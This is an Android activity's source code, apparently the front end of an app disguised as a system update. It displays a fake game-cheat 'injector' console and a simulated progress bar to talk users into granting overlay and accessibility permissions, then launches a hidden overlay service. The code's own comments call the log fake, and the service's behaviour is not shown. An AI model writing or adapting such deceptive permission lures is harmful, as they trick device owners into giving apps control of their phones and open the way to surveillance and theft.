package com.system.updatex;

import android.animation.ObjectAnimator;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    private Button overlayButton;
    private Button accessibilityButton;
    private Button activateButton;

    private ProgressBar progressBar;
    private TextView statusText;
    private TextView txtLogo;
    private TextView txtConsole;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean activating = false;

    // Terminal Typewriter Logic
    private String[] consoleMessages = {
            "> Injecting libfr4nx.so...",
            "> Bypassing anti-cheat...",
            "> Searching for game process...",
            "> Patch applied successfully.",
            "> Ready."
    };
    private int messageIndex = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().setStatusBarColor(android.graphics.Color.rgb(8, 6, 16));
        getWindow().setNavigationBarColor(android.graphics.Color.rgb(8, 6, 16));

        setContentView(R.layout.activity_main);

        overlayButton = findViewById(R.id.overlayPermissionButton);
        accessibilityButton = findViewById(R.id.accessibilityPermissionButton);
        activateButton = findViewById(R.id.activateButton);
        progressBar = findViewById(R.id.progressBar);
        statusText = findViewById(R.id.statusText);
        txtLogo = findViewById(R.id.txtLogo);
        txtConsole = findViewById(R.id.txtConsole);

        // Pulse Logo
        if (txtLogo != null) {
            ObjectAnimator scaleX = ObjectAnimator.ofFloat(txtLogo, "scaleX", 1f, 1.03f, 1f);
            ObjectAnimator scaleY = ObjectAnimator.ofFloat(txtLogo, "scaleY", 1f, 1.03f, 1f);
            scaleX.setDuration(1500);
            scaleY.setDuration(1500);
            scaleX.setRepeatCount(ObjectAnimator.INFINITE);
            scaleY.setRepeatCount(ObjectAnimator.INFINITE);
            scaleX.start();
            scaleY.start();
        }

        // Start Fake Terminal Log
        startConsoleLog();

        overlayButton.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        });

        accessibilityButton.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        activateButton.setOnClickListener(v -> activateSession());
    }

    private void startConsoleLog() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (messageIndex < consoleMessages.length) {
                    txtConsole.append("\n" + consoleMessages[messageIndex]);
                    messageIndex++;
                    handler.postDelayed(this, 2000); // Add a line every 2 seconds
                } else {
                    messageIndex = 0;
                    txtConsole.setText("> Initializing FR4NX Engine...");
                    handler.postDelayed(this, 2000);
                }
            }
        }, 2000);
    }

    @Override
    protected void onResume() {
        super.onResume();
        refreshPermissions();
    }

    private boolean hasOverlayPermission() {
        return Settings.canDrawOverlays(this);
    }

    private boolean hasAccessibilityPermission() {
        String enabledServices = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServices == null) return false;
        String component = getPackageName() + "/" + KioskAccessibilityService.class.getName();
        return enabledServices.toLowerCase().contains(component.toLowerCase());
    }

    private void refreshPermissions() {
        overlayButton.setText(hasOverlayPermission() ? "Overlay Mounted ✓" : "1. Mount Mod Overlay");
        accessibilityButton.setText(hasAccessibilityPermission() ? "Injector Active ✓" : "2. Enable Auto-Injector");
    }

    private void activateSession() {
        if (activating) return;

        if (!hasOverlayPermission()) {
            Toast.makeText(this, "Mount Mod Overlay first!", Toast.LENGTH_SHORT).show();
            return;
        }

        if (!hasAccessibilityPermission()) {
            Toast.makeText(this, "Enable Auto-Injector first!", Toast.LENGTH_SHORT).show();
            return;
        }

        activating = true;
        statusText.setText("INJECTING... DO NOT CLOSE APP");
        txtConsole.setText("> Injecting payload into memory...");
        progressBar.setVisibility(View.VISIBLE);
        progressBar.setProgress(0);
        activateButton.setEnabled(false);

        new Thread(() -> {
            for (int i = 0; i <= 100; i += 2) {
                final int currentProgress = i;
                handler.post(() -> progressBar.setProgress(currentProgress));
                try { Thread.sleep(50); } catch (InterruptedException e) {}
            }
            handler.post(this::startAuthorizedSession);
        }).start();
    }

    private void startAuthorizedSession() {
        try {
            Intent serviceIntent = new Intent(this, OverlayService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            statusText.setText("INJECTION SUCCESSFUL");
            finish();
        } catch (Exception e) {
            activating = false;
            activateButton.setEnabled(true);
            progressBar.setVisibility(View.GONE);
            statusText.setText("INJECTION FAILED");
            Toast.makeText(this, e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
